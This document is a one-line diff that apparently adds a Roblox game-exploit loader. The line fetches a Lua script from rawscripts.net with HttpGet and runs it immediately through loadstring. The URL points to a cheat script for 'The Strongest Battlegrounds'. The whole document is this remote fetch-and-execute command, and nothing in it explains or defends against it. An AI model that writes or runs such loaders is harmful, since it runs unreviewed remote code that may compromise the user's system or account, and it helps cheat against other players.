@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/The-Strongest-Battlegrounds-Sorcerer-Everybody-Knows-or-Baldy-To-Sorcerer-17616"))()
